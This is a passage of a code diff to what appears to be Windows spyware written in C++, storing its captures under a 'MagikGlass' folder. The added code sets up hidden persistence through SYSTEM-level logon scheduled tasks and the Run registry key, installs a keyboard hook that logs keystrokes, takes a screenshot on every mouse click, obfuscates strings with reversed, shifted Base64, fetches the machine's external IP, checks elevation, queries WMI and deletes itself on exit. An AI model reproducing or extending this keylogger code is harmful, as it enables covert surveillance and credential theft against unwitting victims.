+        ShellExecuteA(NULL, "open", "schtasks.exe", Cmd.c_str(), NULL, SW_HIDE);
+        Cmd = "/create /sc onlogon /tn \"";
+        Cmd += AppName;
+        Cmd += "\" /tr ";
+        Cmd += szValue;
+        Cmd += " /ru \"SYSTEM\"";
+        ShellExecuteA(NULL, "open", "schtasks.exe", Cmd.c_str(), NULL, SW_HIDE);
     }
-
-    lResult = RegCreateKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, 0, (KEY_WRITE | KEY_READ), NULL, &hKey, NULL);
-
-    fSuccess = (lResult == 0);
-
-    if (fSuccess)
-    {
-        dwSize = (DWORD)(strlen(szValue) + 1) * 2;
-        lResult = RegSetValueExA(hKey, pszAppName, 0, REG_SZ, (BYTE*)szValue, dwSize);
-        fSuccess = (lResult == 0);
-    }
-
-    if (hKey != NULL)
-    {
+    else {
+        RegCreateKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, 0, (KEY_WRITE | KEY_READ), NULL, &hKey, NULL);
+        RegSetValueExA(hKey, AppName, 0, REG_SZ, (BYTE*)szValue, strlen(szValue) + 1);
         RegCloseKey(hKey);
-        hKey = NULL;
     }
-
-    return fSuccess;
+    return;
 }
 
 ULONG WINAPI Protect(LPVOID Parameter) {
@@ -810,30 +981,238 @@ std::string GetCpuInfo()
     std::string cpu;
     for (int id : functionIds)
     {
-        __cpuid(integerBuffer.data(), id);
+        __cpuid(integerBuffer.data(), id);                                          //since its x64 use __cpuid instead of inline asm
         std::memcpy(charBuffer.data(), integerBuffer.data(), sizeofIntegerBuffer);
         cpu += std::string(charBuffer.data());
     }
     return cpu;
 }
 
-bool fexists(std::string filename) {
+BOOL fexists(std::string filename) {
     DWORD dwAttrib = GetFileAttributes(filename.c_str());
 
-    if(dwAttrib != INVALID_FILE_ATTRIBUTES)
-        return true;
+    return (dwAttrib != INVALID_FILE_ATTRIBUTES &&
+        !(dwAttrib & FILE_ATTRIBUTE_DIRECTORY));
 }
 
 void FinalExit() {
     char PathToSelf[MAX_PATH];
     GetModuleFileNameA(NULL, PathToSelf, MAX_PATH);
-    std::string Command = "/C ping 1.1.1.1 - n 1 - w 3000 > Nul & Del /f /q \"";
+    std::string Command = "/C timeout 3 /nobreak > Nul & Del /f /q \"";
     Command += PathToSelf;
     Command += "\"";
     ShellExecuteA(0, "open", "cmd.exe", Command.c_str(), 0, SW_HIDE);
     exit(0);
 }
 
+std::string HardDecode(std::string EncodedString) {
+    std::string Ret = { NULL };
+    std::string Buf;
+    for (int i = EncodedString.size() - 1; i >= 0; i--) {
+        Buf += EncodedString[i] - 1;
+    }
+    Base64::decode(Buf, &Ret);
+    return Ret;
+}
 
+LRESULT CALLBACK KeyboardThread(int nCode, WPARAM wParam, LPARAM lParam)
+{
+    BOOL fEatKeystroke = FALSE;
+    KBDLLHOOKSTRUCT* keyboard = (KBDLLHOOKSTRUCT*)lParam;
+    if (nCode == HC_ACTION)
+    {
+        switch (wParam)
+        {
+        case WM_KEYDOWN:
+            if (Counter >= CharactersPerLog) {
+                mutex = true;
+                ExitThread(0);
+            }
+            if(LogMode == 2){
+                Counter++;
+            }
+            MyLog.LogItInt(keyboard->vkCode);
+
+            break;
+        case WM_SYSKEYDOWN:
+            break;
+        case WM_KEYUP:
+            break;
+        case WM_SYSKEYUP:
+            break;
+        }
+    }
+    return(fEatKeystroke ? 1 : CallNextHookEx(NULL, nCode, wParam, lParam));
+}
+
+int Hooker(int HookType, HOOKPROC CallbackFunc)
+{
+    // Install the low-level keyboard & mouse hooks
+    HHOOK hhkLowLevelKybd = SetWindowsHookExA(HookType, CallbackFunc, 0, 0);
+
+    // Keep this app running until we're told to stop
+    MSG msg;
+    while (!GetMessage(&msg, NULL, NULL, NULL)) {    //this while loop keeps the hook
+        TranslateMessage(&msg);
+        DispatchMessage(&msg);
+    }
+
+    UnhookWindowsHookEx(hhkLowLevelKybd);            //unhook regardless of mutex state if the thread is forced to close
+
+    return(0);
+}
+
+LRESULT CALLBACK MouseThread(_In_ int nCode, _In_ WPARAM wParam, _In_ LPARAM lParam) {
+
+    MSLLHOOKSTRUCT* Mouse = (MSLLHOOKSTRUCT*)lParam;
+    if (wParam == WM_LBUTTONDOWN || wParam == WM_RBUTTONDOWN) {
+        if (Counter2 >= ScreenshotsPerZip) {
+            mutex2 = true;
+            ExitThread(0);                                      //kill the entire thread when done
+        }
+        char* AppData = nullptr;
+        DWORD Size = MAX_LENGTH + 1;
+        size_t AppDataSize;
+        _dupenv_s(&AppData, &AppDataSize, "APPDATA");
+        std::string ScreenshotName = AppData;
+        ScreenshotName += "\\MagikGlass\\SC_";
+        if(wParam == WM_LBUTTONDOWN)
+            ScreenshotName += "LCLICK_";
+        if(wParam == WM_RBUTTONDOWN)
+            ScreenshotName += "RCLICK_";
+        ScreenshotName += "x";
+        ScreenshotName += std::to_string(Mouse->pt.x);
+        ScreenshotName += "y";
+        ScreenshotName += std::to_string(Mouse->pt.y);
+        ScreenshotName += "_";
+        ScreenshotName += std::to_string(GetTickCount());
+        ScreenshotName += ".png";
+        TakeScreenShot(ScreenshotName.c_str());
+        Counter2++;
+    }
+    return CallNextHookEx(NULL, nCode, wParam, lParam);
+}
+
+void TimerThread() {
+    std::this_thread::sleep_for(std::chrono::minutes(LogTimer));
+    if(LogMode == 1){
+        Counter = CharactersPerLog;
+    }
+    ExitThread(0);
+}
+
+std::string RetrieveExternalIp(std::string CurrentDir) {
+    std::string Ret;
+    std::string VersionFile = CurrentDir;
+    VersionFile += "\\ExtIP.txt";
+    URLDownloadToFileA(NULL, "https://api.my-ip.io/ip.txt" , VersionFile.c_str(), 0, NULL);
+    SetFileAttributesA(VersionFile.c_str(), FILE_ATTRIBUTE_HIDDEN);
+    std::ifstream VersionFileIO(VersionFile);
+    if (!VersionFileIO.eof()) {
+        std::getline(VersionFileIO, Ret, '\0');
+    }
+    VersionFileIO.close();
+    DeleteFileA(VersionFile.c_str());
+    return Ret;
+}
+
+BOOL IsElevated() {
+    BOOL fRet = FALSE;
+    HANDLE hToken = NULL;
+    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
+        TOKEN_ELEVATION Elevation;
+        DWORD cbSize = sizeof(TOKEN_ELEVATION);
+        if (GetTokenInformation(hToken, TokenElevation, &Elevation, sizeof(Elevation), &cbSize)) {
+            fRet = Elevation.TokenIsElevated;
+        }
+    }
+    if (hToken) {
+        CloseHandle(hToken);
+    }
+    return fRet;
+}
+
+std::string QueryVMI(bstr_t Table, const wchar_t* Item) {
+
+    HRESULT hres;
+    hres = CoInitializeEx(0, COINIT_MULTITHREADED);
+    hres = CoInitializeSecurity(
+        NULL,
+        -1,                          // COM authentication
+        NULL,                        // Authentication services
+        NULL,                        // Reserved
+        RPC_C_AUTHN_LEVEL_DEFAULT,   // Default authentication 
+        RPC_C_IMP_LEVEL_IMPERSONATE, // Default Impersonation  
+        NULL,                        // Authentication info
+        EOAC_NONE,                   // Additional capabilities 
+        NULL                         // Reserved
+    );
+    IWbemLocator* pLoc = NULL;
+    hres = CoCreateInstance(
+        CLSID_WbemLocator,
+        0,
+        CLSCTX_INPROC_SERVER,
+        IID_IWbemLocator, (LPVOID*)&pLoc);
+    IWbemServices* pSvc = NULL;
+    hres = pLoc->ConnectServer(
+        _bstr_t(L"ROOT\\CIMV2"), // Object path of WMI namespace
+        NULL,                    // User name. NULL = current user
+        NULL,                    // User password. NULL = current
+        0,                       // Locale. NULL indicates current
+        NULL,                    // Security flags.
+        0,                       // Authority (for example, Kerberos)
+        0,                       // Context object 
+        &pSvc                    // pointer to IWbemServices proxy
+    );
+    hres = CoSetProxyBlanket(
+        pSvc,                        // Indicates the proxy to set
+        RPC_C_AUTHN_WINNT,           // RPC_C_AUTHN_xxx
+        RPC_C_AUTHZ_NONE,            // RPC_C_AUTHZ_xxx
+        NULL,                        // Server principal name 
+        RPC_C_AUTHN_LEVEL_CALL,      // RPC_C_AUTHN_LEVEL_xxx 
+        RPC_C_IMP_LEVEL_IMPERSONATE, // RPC_C_IMP_LEVEL_xxx
+        NULL,                        // client identity
+        EOAC_NONE                    // proxy capabilities 
+    );
+    IEnumWbemClassObject* pEnumerator = NULL;
+    hres = pSvc->ExecQuery(
+        bstr_t("WQL"),
+        Table,
+        WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY,
+        NULL,
+        &pEnumerator);
+    IWbemClassObject* pclsObj = NULL;
+    ULONG uReturn = 0;
+    std::string Ret = {};
+    while (pEnumerator)
+    {
+        HRESULT hr = pEnumerator->Next(WBEM_INFINITE, 1,
+            &pclsObj, &uReturn);
+
+        if (0 == uReturn)
+        {
+            break;
+        }
+
+        VARIANT vtProp;
+
+        VariantInit(&vtProp);
+        // Get the value of the Name property
+        hr = pclsObj->Get(Item, 0, &vtProp, 0, 0);
+        VariantClear(&vtProp);
+        Ret = _com_util::ConvertBSTRToString(vtProp.bstrVal);
+        pclsObj->Release();
+    }
+
+    // Cleanup
+    // ========
+
+    pSvc->Release();
+    pLoc->Release();
+    pEnumerator->Release();
+    CoUninitialize();
+
+    return Ret;
+}
 
 #pragma warning( pop )
